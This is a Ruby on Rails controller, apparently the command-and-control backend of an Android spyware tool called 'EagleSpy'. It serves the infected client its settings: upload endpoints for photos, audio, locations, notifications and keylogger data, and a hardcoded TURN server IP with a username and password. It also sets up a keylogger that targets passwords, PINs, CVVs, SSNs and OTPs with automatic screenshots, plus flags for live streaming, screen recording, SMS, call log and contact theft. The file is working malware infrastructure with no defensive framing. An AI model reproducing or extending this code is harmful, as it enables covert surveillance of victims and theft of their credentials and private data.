# API endpoint for Android client configuration (ENHANCED)
class Api::ConfigController < ApplicationController
  skip_before_action :verify_authenticity_token

  # GET /api/config
  # Returns comprehensive server configuration for Android client
  def show
    config = {
      # WebSocket configuration
      websocket_url: build_websocket_url,
      use_https: ENV['USE_SSL'] == 'true',
      
      # API endpoints
      api_base_url: build_api_base_url,
      endpoints: {
        photos: "#{build_api_base_url}/photos",
        audio: "#{build_api_base_url}/audio",
        locations: "#{build_api_base_url}/locations",
        keylogger: "#{build_api_base_url}/keylogger",
        keylogger_ack: "#{build_api_base_url}/keylogger/ack",
        notifications: "#{build_api_base_url}/notifications"
      },
      
      # WebRTC configuration
      turn_servers: [
        {
          url: "turn:#{ENV['TURN_SERVER'] || '213.91.211.150:3478'}",
          username: ENV['TURN_USER'] || 'eaglespy',
          credential: ENV['TURN_PASSWORD'] || 'EagleSpy2024Secure!'
        }
      ],
      stun_servers: [
        "stun:stun.l.google.com:19302",
        "stun:stun1.l.google.com:19302",
        "stun:stun2.l.google.com:19302",
        "stun:stun3.l.google.com:19302",
        "stun:stun4.l.google.com:19302"
      ],
      webrtc: {
        video_width: 1280,
        video_height: 720,
        video_fps: 30,
        audio_echo_cancellation: true,
        audio_noise_suppression: true,
        audio_auto_gain_control: true
      },
      
      # Service intervals
      polling_interval: 15, # minutes
      location_interval: 10, # seconds
      keylogger_flush_interval: 300, # 5 minutes (in seconds)
      heartbeat_interval: 60, # seconds
      
      # Keylogger configuration
      keylogger: {
        max_buffer_size: 500000, # 500KB
        sensitive_keywords: %w[password pass pwd pin cvv ssn card security secret otp code token],
        auto_screenshot: true,
        track_input_types: true
      },
      
      # App metadata
      version: "5.0.0",
      build: "20240101",
      min_android_version: 24, # Android 7.0
      features: {
        live_streaming: true,
        keylogger: true,
        screen_recording: true,
        audio_recording: true,
        location_tracking: true,
        file_manager: true,
        sms_management: true,
        call_logs: true,
        contacts: true,
        notifications: true
      }
    }

    render json: config
  end

  private

  def build_websocket_url
    host = ENV['RAILS_HOST'] || request.host
    port = ENV['RAILS_PORT'] || '3000'
    protocol = ENV['USE_SSL'] == 'true' ? 'wss' : 'ws'
    
    "#{protocol}://#{host}:#{port}/cable"
  end
  
  def build_api_base_url
    host = ENV['RAILS_HOST'] || request.host
    port = ENV['RAILS_PORT'] || '3000'
    protocol = ENV['USE_SSL'] == 'true' ? 'https' : 'http'
    
    "#{protocol}://#{host}:#{port}/api"
  end
end
